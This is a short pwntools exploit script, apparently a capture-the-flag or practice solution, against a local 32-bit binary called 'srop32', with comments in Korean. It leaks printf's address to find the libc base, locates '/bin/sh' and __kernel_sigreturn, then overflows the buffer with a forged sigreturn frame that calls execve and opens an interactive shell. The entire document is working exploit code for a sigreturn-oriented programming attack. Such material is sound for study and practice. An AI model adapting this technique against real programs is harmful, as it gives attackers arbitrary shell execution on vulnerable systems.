from pwn import *

p = process('./srop32')
libc = ELF('/usr/lib32/libc.so.6')

context.terminal = ['tmux', 'splitw', '-h']

def slog(n, a): return success(': '.join([n, hex(a)]))

p.recvuntil(b'Printf() address : ')
printf = int(p.recvline()[:-1], 16)
lb = printf - libc.sym['printf']
binsh = lb + next(libc.search(b'/bin/sh\x00'))

# vdso를 통해 오프셋을 계산해야하지만, libc 유출만이 가능하므로 libc_base 기반 ksigreturn 주소 계산
ksigreturn = lb + 0x25e590
syscall = ksigreturn + 0x6 # ksigreturn+6에 int 0x80(syscall) 명령어 있음 ㅇㅇ

slog('printf addr', printf)
slog('libc_base', lb)
slog('/bin/sh', binsh)
slog('__kernel_sigreturn', ksigreturn)
slog('syscall', syscall)

pay = b'A'*0x42 # 66
pay += p32(ksigreturn)
pay += p32(0xdeadbeef) # ebp + 0x8, kernel에서 사용할 sigcontext, 그러니까 곧 pt_regs에 복사될 정보는 ebp+0xc(ebp+12)부터 저장됨

frame = SigreturnFrame(kernel='amd64') # 문제의 환경에 따라 다름, 지금 경우는 64비트에서 32비트 바이너리를 돌리는 것이라 가정
frame.eax = 0xb # 0x0b, execve()의 x86에서의 syscall number.
frame.esp = syscall # sigreturn의 ret addr을 syscall로 위조
frame.eip = syscall # 실행할 명령(int 0x80)
frame.ebx = binsh # x86 ABI, ebx가 첫 번째 인자를 가리킴.

pay += bytes(frame)

gdb.attach(p, '''
b *vuln+89
c
''')


p.send(pay)
pause()
p.interactive()
